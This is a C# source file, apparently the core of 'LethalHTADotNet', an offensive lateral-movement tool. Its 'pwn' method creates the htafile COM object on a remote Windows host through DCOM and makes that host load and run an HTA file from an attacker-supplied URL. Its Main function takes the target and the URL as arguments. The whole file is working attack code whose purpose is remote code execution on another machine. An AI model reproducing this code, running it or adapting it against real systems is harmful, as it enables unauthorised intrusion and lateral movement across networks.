using System;
using static LethalHTADotNet.ComUtils;

namespace LethalHTADotNet
{
    public class LethalHTA
    {
        static Guid iUnknown = new Guid("00000000-0000-0000-C000-000000000046");
        static Guid htafile = new Guid("3050F4D8-98B5-11CF-BB82-00AA00BDCE0B");

        public void pwn(string target, string htaUrl)
        {
            try
            {
                IMoniker moniker;
                CreateURLMonikerEx(IntPtr.Zero, htaUrl, out moniker, 0);

                MULTI_QI[] mqi = new MULTI_QI[1];
                mqi[0].pIID = IID_IUnknownPtr;

                COSERVERINFO info = new COSERVERINFO();
                info.pwszName = target;
                info.dwReserved1 = 0;
                info.dwReserved2 = 0;
                info.pAuthInfo = IntPtr.Zero;

                CoCreateInstanceEx(htafile, null, CLSCTX.CLSCTX_REMOTE_SERVER, info, 1, mqi);
                if (mqi[0].hr != 0)
                {
                    Console.WriteLine("Creating htafile COM object failed on target");
                    return;
                }

                IPersistMoniker iPersMon = (IPersistMoniker)mqi[0].pItf;
                FakeObject fake = new FakeObject(moniker);
                iPersMon.Load(0, fake, null, 0);
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception:  " + e);
            }
        }


        public static void Main(string[] args)
        {

            if (args.Length != 2)
            {
                Console.WriteLine("LethalHTADotNet.exe target url/to/hta");
                return;
            }
            LethalHTA hta = new LethalHTA();
            hta.pwn(args[0], args[1]);
            
        }
    }
}
